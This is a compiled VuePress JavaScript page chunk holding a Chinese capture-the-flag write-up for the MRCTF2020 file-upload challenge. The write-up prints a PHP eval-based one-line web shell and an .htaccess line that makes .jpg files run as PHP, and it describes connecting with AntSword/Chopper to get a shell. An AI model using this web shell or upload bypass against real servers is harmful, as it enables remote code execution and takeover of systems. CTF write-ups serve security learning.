(window.webpackJsonp=window.webpackJsonp||[]).push([[32],{357:function(t,a,s){"use strict";s.r(a);var e=s(3),r=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"mrctf2020-你传你🐎呢-1"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#mrctf2020-你传你🐎呢-1"}},[t._v("#")]),t._v(" MRCTF2020 你传你🐎呢 1")]),t._v(" "),a("h2",{attrs:{id:"题目"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#题目"}},[t._v("#")]),t._v(" 题目")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131903645.png",alt:"image-20220713190004283"}})]),t._v(" "),a("h3",{attrs:{id:"解题思路"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解题思路"}},[t._v("#")]),t._v(" 解题思路")]),t._v(" "),a("ul",[a("li",[t._v("判断是否有过滤")]),t._v(" "),a("li",[t._v("过滤什么文件，能上传什么")]),t._v(" "),a("li",[t._v("上传一句话木马")]),t._v(" "),a("li",[t._v("菜刀连接获得webshell从而拿到flag")])]),t._v(" "),a("h3",{attrs:{id:"解题过程"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解题过程"}},[t._v("#")]),t._v(" 解题过程")]),t._v(" "),a("p",[t._v("直接上传一个一句话木马的php文件看行不行")]),t._v(" "),a("p",[t._v("代码如下")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("phpinfo")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("@"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("eval")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_POST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'shell'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("然后出现了这个页面")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131909812.png",alt:"image-20220713190924730"}})]),t._v(" "),a("p",[t._v("开启bp抓包，将包发送至repeater试试都能上传什么文件")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131915832.png",alt:"image-20220713191551646"}})]),t._v(" "),a("p",[t._v("经过尝试发现png图片格式的木马文件也能上传成功。")]),t._v(" "),a("p",[t._v("但因为要把这个php的代码解析出来从而通过菜刀连接，接下来就尝试一下看htaccess文件能否上传成功")]),t._v(" "),a("p",[t._v("具体利用细节："),a("a",{attrs:{href:"https://xz.aliyun.com/t/8267",target:"_blank",rel:"noopener noreferrer"}},[t._v("Apache的.htaccess利用技巧 - 先知社区 (aliyun.com)"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("htaccess文件内容如下")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("AddType application/x-httpd-php .jpg\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("功能是将目录下的所有文件都解析成php")]),t._v(" "),a("p",[t._v("发现.htaccess文件能上传，那么接下来就简单很多了，直接用蚁剑连接后台就能拿到flag了")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131934081.png",alt:"image-20220713193446090"}})]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131954592.png",alt:"image-20220713195451747"}})])])}),[],!1,null,null,null);a.default=r.exports}}]);